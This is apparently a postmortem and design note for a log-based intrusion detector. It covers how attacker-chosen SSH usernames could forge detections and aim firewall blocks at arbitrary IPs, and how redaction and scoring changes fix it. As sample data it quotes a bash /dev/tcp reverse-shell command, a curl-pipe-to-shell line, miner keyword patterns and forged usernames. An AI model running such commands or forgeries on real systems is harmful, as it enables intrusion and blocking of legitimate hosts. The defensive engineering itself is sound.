# Detection: who gets to choose the verdict

A remote, unauthenticated party picks their own SSH username, and that string
lands in `/var/log/auth.log`. The sanitiser has always treated it as hostile
*text* — control characters, terminal escapes, bidi overrides. The rule engine
did not treat it as hostile *input*, and for three compounding reasons an
attacker could use it to choose which detection fired, what the event was scored,
and which IP address the event was attributed to.

This note is the postmortem and the design that replaced it.

---

## The defect

Three mechanisms, each defensible alone, wrong together.

**1. Precedence was slice order.** `ApplyWith` took the verdict — rule name,
category, score, outcome, MITRE — from the *first* rule in the table that
matched. That is not a precedence rule; it is an artefact of file layout,
invisible at the call site, and silently reordered by any edit that moves a
block.

**2. Entity extraction belonged to the winner.** `applyCaptures` ran only for
that first match. A rule with no capture groups winning meant an event with no
user, no port, and a source address recovered by `firstIP()` — a scan for the
first IPv4-looking token anywhere in the line.

**3. Keyword rules read the whole message.** `cryptominer_indicator` hunts for
`xmrig|minerd|cpuminer|stratum+tcp://|nanopool|supportxmr` anywhere in the text,
carries no process filter, and sits near the top of the table because it scores
92.

So:

```
Failed password for invalid user xmrig from 203.0.113.45 port 51001 ssh2
```

matched `cryptominer_indicator` before `ssh_failed_password`. Measured on the
build before this change:

```
score=100 critical rule=cryptominer_indicator src=203.0.113.45 outcome=success user=(none)
```

Three consequences, in increasing order of seriousness.

**The event was wrong.** Category `impact`, outcome `success`, no username, no
port. An analyst triaging this sees a cryptominer on a host that has none.

**Correlation went blind.** `correlate.Observe` counts an event as an
authentication failure only when `outcome == "failure"` and the category is
`authentication` or `privilege-escalation`. The hijacked event is neither, so it
was never counted. Five failures counted as zero, no `correlated_brute_force`
was raised, and the subsequent successful login raised no
`correlated_successful_login_after_bruteforce` either. **An attacker who used
`xmrig` as the username on every attempt was invisible to the correlator at any
rate, indefinitely, for the cost of one word in a wordlist.**

**The address was attacker-chosen.** Because no capture ran, `firstIP()` scanned
the raw message — and the username sits *before* the peer address:

```
user = 8.8.8.8.xmrig  ->  score=100  src=8.8.8.8
```

The responder acts at score 90 against whatever `source_ip` says. Its allowlist
covers loopback, RFC1918 and `$SSH_CLIENT`; it does not cover a public resolver,
a gateway, a package mirror, or a monitoring endpoint. In enforce mode this was
an arbitrary-IP firewall block primitive, aimed by a remote party who never
authenticated.

A second, independent path to the same place: `ssh_failed_password` captured the
username as `[^\s]+`, which stops at the first space. A username of
`x from 9.9.9.9 port 1` therefore satisfied the pattern's own
` from <ip> port <n>` tail, so the **capture group** — not the fallback —
resolved to the attacker's address.

### The claim that was false

The README said a honeytoken was

> the only single event in the system that clears the firewall-response
> threshold without correlation.

That was false in two separate ways, and only one of them was this bug.

*By this bug:* any of fourteen keyword rules could be reached from a username,
several of them scoring above 90 once the `+8 public_source` modifier applied.

*By design, independently:* `reverse_shell_bash_devtcp` (96),
`cryptominer_indicator` (92) and `log_tampering` (90) are base scores at or above
the threshold. A single genuine line matching any of them has always cleared it.
That is arguable behaviour — a reverse shell probably *should* be actionable on
one line — but the claim as written was wrong before the vulnerability existed,
and nothing tested it.

What is true, and is what the canary is actually for: a honeytoken is the only
detection that reaches **100**, and the only one with no benign explanation.

---

## What changed

### Rules declare a surface

`Rule` gained one field. `Surface` says what text the pattern is entitled to
read, and it is a security control rather than a performance hint.

| | Meaning | Count |
|---|---|---|
| `SurfaceRaw` | Pattern anchors on literal text the daemon emits (`Failed password for`, `pam_unix(`, `[UFW BLOCK]`). May read the message as logged. | 19 |
| `SurfaceRedacted` | Pattern hunts for a keyword anywhere. Reads the message with attacker-chosen spans blanked. | 14 |

`SurfaceRedacted` is the **zero value**, so a rule added without a `Surface` gets
the safe one. Being wrong in that direction costs a missed keyword inside a
username, which is a detection nobody wanted. Being wrong in the other direction
is what this note is about.

### Evaluation runs in two passes

The rules that can safely read a raw line are also the rules that identify which
spans of it the attacker wrote, so the order is forced:

1. `SurfaceRaw` rules match the message as logged. Their `user` / `target_user`
   captures locate the untrusted spans.
2. Those spans are blanked. `SurfaceRedacted` rules match the result.

Redaction is by **byte offset**, not string replacement. Replacing every
occurrence of the captured value would also blank innocent text that happens to
equal it — a user named `root` would erase `root` from `PWD=/root` — and
suppressing real detections is the failure mode this change exists to avoid
creating.

`command` is deliberately *not* redacted. A command line is attacker-influenced
too, but it is a record of something the host **ran**, and scanning it for
reverse shells and pipe-to-shell droppers is the entire point of the keyword
rules. The distinction that matters is between a string someone typed at a login
prompt and a string the machine executed.

### Raw-surface matches are re-confirmed

`SurfaceRaw` is a claim that a pattern cannot be made to match inside an
attacker-chosen span. For most rules that claim holds by inspection — but "by
inspection" is how the original defect survived review, and the claim has to hold
for rules nobody has written yet. Several raw-surface rules turned out to be
forgeable from a username, and two of them outscore `ssh_failed_password`:

```
username = "victim : user NOT in sudoers"   -> sudo_not_in_sudoers            (72)
username = "add 'evil' to group 'sudo'"     -> user_added_to_privileged_group (74)
```

The alternative considered was **requiring a `Process` filter on every
raw-surface rule**. That was rejected. It narrows detection to a hardcoded set of
syslog tags, which is precisely the failure mode where an OpenSSH upgrade
renaming `sshd` to `sshd-session` takes five rules dark with nothing to say so.
Trading a known vulnerability for a silent-blindness risk is not a trade.

So the check is behavioural instead of structural. A raw-surface match is kept
for the verdict only if its pattern **still matches once the untrusted spans are
blanked**. A rule that matched because of the daemon's own text survives —
`Failed password for [redacted] from ...` is still a failed password. A rule that
matched only because the username *was* `victim : user NOT in sudoers` has
nothing left to match, and is dropped. Captures still come from the raw match, so
the event keeps the real username rather than the marker.

The re-check is skipped entirely when nothing was redacted, which is every line
that carries no user field.

### Precedence is explicit

The verdict goes to the **highest-scoring** match, ties broken by declaration
order. Score is the right discriminator because it is already this project's
statement of how much a detection matters: a reverse shell found inside a sudo
command line should report as a reverse shell, not as "a sudo command ran".
Declaration order survives only as a deterministic tie-break, never as the
primary rule.

### Every match contributes its captures

Captures are applied from the losing matches first, then from the winner, so the
winning rule's view is authoritative while a lower-precedence match can still
supply a field the winner does not capture at all. The visible effect on a real
line:

```
sudo: arron : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/198.51.100.9/4444

  before:  rule=reverse_shell_bash_devtcp  user=(none)  target_user=(none)  command=(none)
  after:   rule=reverse_shell_bash_devtcp  user=arron   target_user=root    command=/bin/bash -i >& ...
```

The verdict was already right. The three fields an analyst triages on were
missing, because the rule that won captured nothing.

### `firstIP` reads redacted text

An address inside a username is a string the attacker typed, not the peer sshd
was talking to. The username captures were also widened from `[^\s]+` to `.+`,
which anchors on the **last** ` from <ip> port <n>` in the line — the one sshd
wrote — and captures the whole span so redaction can cover it.

### Sigma and IOC read redacted text too

An imported Sigma rule written as `message|contains: xmrig` has exactly the same
defect, and Sigma rules are permitted to escalate a verdict. The matcher is now
handed a view of the event whose `message` is redacted. Rules that genuinely want
to inspect an account name should match the `user` field, which is unmodified and
is where the transpiler's `FIELD_MAP` points them.

The wrapper lives in `enrich`, not in the `sigma` package: the matcher's own
semantics are pinned by the shared Go/Python agreement vectors, and this is a
decision about what text to hand it, not about how it matches. The vectors are
untouched and still pass.

IOC candidate extraction reads redacted text for the same reason. A feed hit is
capped at 89 and so was never an actuation path, but "known C2 contacted"
appearing because someone typed an address at a login prompt is a false positive
an analyst would chase.

**Honeytokens deliberately still read the raw message.** A canary username is the
exception that proves the rule: nothing on the host is called `admin_backup`, so
a login attempt for `admin_backup` *is* the detection, and it arrives in exactly
the field everything else redacts.

---

## What is pinned, and how it was checked

The entire pre-existing suite — 33 rule tests, the correlator's window and
memory bounds, the pipeline's order guarantee under `-race` — passed with this
bug present, both before and after the fix. So the tests below were checked the
only way that means anything: by removing each leg of the fix and confirming
something fails.

| Leg removed | Tests that fail |
|---|---|
| Redaction disabled | `UsernameContainingARuleKeywordCannotSetTheVerdict`, 12 of 15 `NoAttackerChosenUsernameReachesTheResponseThreshold` subtests, 6 `RawSurfaceRulesCannotBeForgedFromAUsername` subtests |
| Confirmation removed | `RawSurfaceRulesCannotBeForgedFromAUsername` (5 subtests), `AdversarialUsernamesStillReachCorrelation` |
| Captures from winner only | `EntityExtractionSurvivesALosingRule` |
| `firstIP` on raw message | `UsernameContainingAnAddressCannotSetTheSourceIP` (2 subtests) |
| Precedence back to slice order | `DeclarationOrderOnlyBreaksScoreTies` |
| Sigma reads raw message | `ImportedSigmaRuleCannotBeTriggeredByAUsername` |
| IOC reads raw message | `IOCFeedCannotBeTriggeredByAUsername` |

The `firstIP` row is worth calling out, because the first version of that test
did **not** appear in it. It asserted the source address on an
`ssh_failed_password` line — where the rule's own `ip` capture supplies the
answer and `firstIP` is never reached. It passed with the fix reverted. The test
now uses lines where no rule captures an address, which is the only condition
under which the fallback runs.

Two tests guard the opposite failure — redacting so much that detection goes
blind: `ConfirmationKeepsGenuineMatches` runs the real line for all ten rules
that capture an untrusted span, and `CommandContentIsStillScannedForKeywords`
pins that a pipe-to-shell in a sudo command still fires.

---

## Measured

Six lines: five failures with hostile usernames from one address, then a success.
`sentinel-ingestor -in attack.log -out -`, same input to both builds.

**Before**

```
score=100 critical cryptominer_indicator  src=8.8.8.8       outcome=success  user=(none)
score=100 critical cryptominer_indicator  src=203.0.113.45  outcome=success  user=(none)
score= 98 critical log_tampering          src=203.0.113.45  outcome=attempt  user=(none)
score= 54 warning  ssh_failed_password    src=203.0.113.45  outcome=failure  user='authorized_keys'
score=100 critical cryptominer_indicator  src=203.0.113.45  outcome=success  user=(none)
score= 34 notice   ssh_accepted_login     src=203.0.113.45  outcome=success  user='arron'
```

Zero incidents. Four bogus criticals. One of them attributed to `8.8.8.8` at the
score that arms the firewall.

**After**

```
score= 54 warning  ssh_failed_password                          src=203.0.113.45 outcome=failure user='8.8.8.8.xmrig'
score= 54 warning  ssh_failed_password                          src=203.0.113.45 outcome=failure user='xmrig'
score= 54 warning  ssh_failed_password                          src=203.0.113.45 outcome=failure user='history -c'
score= 54 warning  ssh_failed_password                          src=203.0.113.45 outcome=failure user='authorized_keys'
score= 54 warning  ssh_failed_password                          src=203.0.113.45 outcome=failure user='supportxmr'
score= 92 critical correlated_brute_force                       src=203.0.113.45 outcome=attempt
score= 34 notice   ssh_accepted_login                           src=203.0.113.45 outcome=success user='arron'
score= 97 critical correlated_successful_login_after_bruteforce src=203.0.113.45 outcome=success user='arron'
```

**No new noise.** `data/baseline.log`, 604 lines of routine host traffic, produces
an identical severity distribution on both builds — `notice 343, warning 207,
info 54`, zero events at or above 80. The committed demo fixture
(`data/samples/events.sample.jsonl`, 25 events) is byte-identical after the
change, as is `data/events.jsonl` at 629 events: the sample data contains no
adversarial usernames, which is exactly why it never caught this.

Throughput was not re-measured. The change adds one regex evaluation per
raw-surface match on lines that carry a user field, and a `strings.Builder` pass
over those lines; on lines with no user field the redaction and confirmation
paths both short-circuit. That is expected to be small against the ~65 µs/line
the 33-rule sweep already costs, but expected is not measured, and the
benchmarks in `benchmarks/` have not been re-run.

---

## Measuring whether the rules work

"33 detection rules" was a count. Nothing established that a rule fired on the
attack it was written for, nothing established that it stayed quiet on ordinary
traffic, and nothing failed when a rule was added with neither property shown.

`ingestor/internal/enrich/testdata/detection/` now holds two files:

| File | Question |
|---|---|
| `cases.jsonl` | Per rule: a line it must catch, and a near-miss it must not. 66 cases, 33 rules, each carrying a `why`. |
| `benign.log` | 108 lines of ordinary Ubuntu host traffic that must stay below `warning`. |

Four gates, all in `make test`:

- **Coverage.** Every rule must have both a positive and a negative case. Adding
  a rule without them fails the build.
- **Cases hold.** Positives fire; near-misses do not.
- **Positives win the verdict.** Firing is not being reported — a rule always
  outscored on its own canonical line is one the analyst never sees. A case may
  declare a different `verdict` where composition is genuinely better (a package
  install through sudo reports as the sudo command, which names the actor too),
  so the test pins real behaviour rather than being relaxed to accommodate it.
- **Benign budget.** Lines scoring ≥ 40 on `benign.log` must not exceed a
  committed number.

### Why the benign corpus is hand-authored

`scripts/generate-baseline-log.py` already produces a week of routine syslog, and
using it here would have been free. It is also worthless for this purpose: it
emits a fixed cast of shapes — cron, sshd, ufw, sudo, sessions — modelled on the
same assumptions as the rules. Measured against all 604 of its lines, exactly the
nine expected rules fire and nothing else. That reads as a clean false-positive
profile and is really a tautology, because the generator never emits a line
nobody thought about.

`benign.log` is written by hand from what a real Ubuntu box logs and nobody wrote
a rule around: systemd reloading units, snapd refreshing, sshd's own debug
chatter, AppArmor confining snaps, fwupd, anacron, chronyd, thermald, postfix.

### What it found, and what changed

First run: **13 of 108 benign lines scored `warning` or above.**

| Rule | Hits | Change |
|---|---:|---|
| `systemd_unit_installed` | 3 | Pattern matched the bare words `Reloading` and `enabled` before any unit name, so every `systemctl reload` and every package upgrade was a score-56 **persistence** event. Re-anchored on the symlink `systemctl enable` actually writes. |
| `sudo_command_executed` | 4 | Scored 32, and almost every sudo command targets root — that *is* sudo — so `+10 root_involved` fired on nearly all of them and pushed an authorised `sudo systemctl status nginx` to `warning`. Lowered to 20. |
| `authorized_keys_modified` | 2 | Pattern was `(?i)authorized_keys`, a *mention*. sshd names the file on every key login at `LogLevel DEBUG`. Now requires a write verb. |
| `selinux_apparmor_denied` | 2 | 42. A snap-based Ubuntu emits AppArmor denials continuously for confined apps touching ordinary files. Lowered to 30. |
| `ssh_reverse_dns_mismatch` | 1 | 58. sshd logs `POSSIBLE BREAK-IN ATTEMPT` whenever forward and reverse DNS disagree, which is the normal state of most consumer broadband. Lowered to 30. |
| `curl_pipe_shell` | 1 | Unchanged. See below. |

**After: 1.** The budget is 1, and it is this line:

```
ansible-command: Invoked with _raw_params=curl -fsSL https://get.docker.com | sh
```

That one is irreducible with the information available. Configuration management
fetching a script and piping it to a shell is byte-for-byte the same operation as
a dropper, and the rule sees only the command line — not who scheduled it, not
whether the URL is trusted, not whether this host runs Ansible at all. Lowering
the score until it disappears would mean under-reporting a genuine dropper, which
is the wrong direction to be wrong in. It stays, budgeted and named.

**Three of the six changes were score recalibrations rather than pattern fixes,
and that deserves suspicion**: lowering a score until it clears your own gate is
how a metric gets gamed rather than met. Two things constrain it. Every rule
still has to fire *and win the verdict* on its own positive case, so a score
cannot be lowered into irrelevance. And the recalibrations are argued from what
the signal means — root is sudo's definition, AppArmor denials are continuous
under snap, rDNS mismatch is the normal state of consumer broadband — not from
what made the number go down.

### The OpenSSH tag split

Folded in here rather than fixed standalone, because the corpus is what keeps it
fixed. OpenSSH 9.8 (July 2024) split `sshd` into per-connection `sshd-session`
and `sshd-auth` binaries that log under their own syslog tags. Five rules carry
`Process: ["sshd"]` matched with `strings.EqualFold` — an exact equality — so on
Ubuntu 24.10+ and Debian 13 all five stop matching. Silently.

`processAliases` folds the known split tags onto the family. An explicit table,
not a prefix or hyphen rule: `systemd-resolved` must not become `systemd`, and a
rule that widens itself by accident is the same class of surprise in the other
direction. `TestSSHRulesSurviveTheOpenSSHTagSplit` runs all five rules under all
three tags.

This host does not emit the new tag yet (`grep -c 'sshd-session\[' /var/log/auth.log`
returns 0 on OpenSSH < 9.8), so nothing here was broken in practice — the test is
what stands between an `apt upgrade` and losing most of the SSH detection.

### A bug the recalibration surfaced

Lowering `sudo_command_executed` broke `TestIOCCannotReachTheResponseThreshold`,
which had used that rule's score to reach the feed cap. Fixing the test exposed
a real defect in the cap itself: it clamped the **total** score, so a feed hit
dragged a score-96 reverse shell down to 89 — *below* the responder's threshold.
Agreeing with a threat feed made the system act less decisively on its own
strongest detection, the exact inverse of what the cap is for. It now constrains
only what a feed can add: `TestIOCDoesNotLowerAnAlreadyActionableScore`.

## Correlation: the clock, and the account

Two defects from the same audit, fixed together because the detection corpus now
exists to catch a regression in either.

### A future-dated line reset the brute-force window

`prune()` derives its cutoff from the timestamp of the arriving event. One line
dated ahead of the stream therefore expired *every* accumulated failure — the
count went to one, the burst never completed, and the evidence was gone.

Reachability without an attacker: an NTP step, a container with a wrong clock, or
two log files concatenated (which `make shadow-demo` does). Reachability *with*
one: any source where the timestamp is attacker-influenced — a forwarded syslog
stream, an application log — where interleaving one such line every few attempts
holds the count below the threshold indefinitely.

`windowClock` fixes it with two rules. A timestamp more than `futureTolerance`
(2 minutes) ahead of ingest time is not trusted, and the window is evaluated at
the source's own monotonic high-water mark so an out-of-order arrival cannot wind
it backwards and resurrect expired failures.

The first attempt **clamped** a distrusted timestamp to the tolerance limit. That
does not work and the test caught it: with a 60-second window and a limit two
minutes ahead, the clamped value still expires every genuine failure. A timestamp
you have decided not to believe cannot define "now" at any magnitude — it has to
be ignored for windowing entirely. Skew is counted and surfaced on the incident
(`clock_skew_events`, tag `clock-skew`) rather than silently corrected: "your
clocks disagree" is something an operator needs told.

`TestALegitimateQuietGapStillAdvancesTheWindow` is the counterweight — a source
idle for six hours must not have its old failures held in the window forever.

### A shared address is not an identity

`correlated_successful_login_after_bruteforce` scored **97** — the number that
arms the firewall — whenever a success followed three failures from the same
address. It did not check *which account* succeeded.

Behind CGNAT, a corporate egress, or a university range, an attacker's failures
and a colleague's legitimate login share a source address. The one detection
wired to active response was the one treating an IP as an identity.

Now the account decides the verdict:

| Case | Rule | Score |
|---|---|---:|
| the account that succeeded was one the source was guessing at | `correlated_successful_login_after_bruteforce` | 97 |
| the account was never targeted | `correlated_login_from_attacking_source` | 74 |

The second is reported, not suppressed — going blind on "a successful login from
an address that was brute-forcing" would be the worse failure — but it sits below
the score that acts without a human, and its message says which explanation is
likely.

The uncertain case is handled explicitly rather than by default. Once
`maxUsersPerSource` is reached the tracked set is a sample, so "never targeted"
stops being knowable; the finding keeps the higher severity instead of being
downgraded on missing evidence, which would otherwise let an attacker earn the
lower score by trying enough usernames. And the compromise path gets its own
cooldown, separate from the brute-force one, so a busy shared address cannot
re-raise the incident every few seconds.

## What this does not fix

- **`session_opened` / `session_closed` remain unfiltered by process** and match
  on any daemon. They score 16 and 10, below anything that owns a line, so they
  cannot take a verdict — but that is a safety argument resting on score
  arithmetic rather than on a mechanism.
- **`pam_authentication_failure` still never captures `rhost`.** Its pattern
  chains lazy `.*?` between two optional groups and returns `ip = nil` on every
  real PAM line. `firstIP` happens to recover the same address, which is why
  nothing visibly broke. Unfixed here; it is a capture bug, not a surface bug.
- ~~The false-positive profile of the rule set is still unmeasured.~~ Measured;
  see above. 13 → 1 on a hand-authored benign corpus.
- **`source_ip` on a reverse shell is the C2 address**, picked up by `firstIP`
  from the `/dev/tcp/` target. Blocking it is arguably the right outcome, but the
  field is named `source_ip` and the address is a destination.
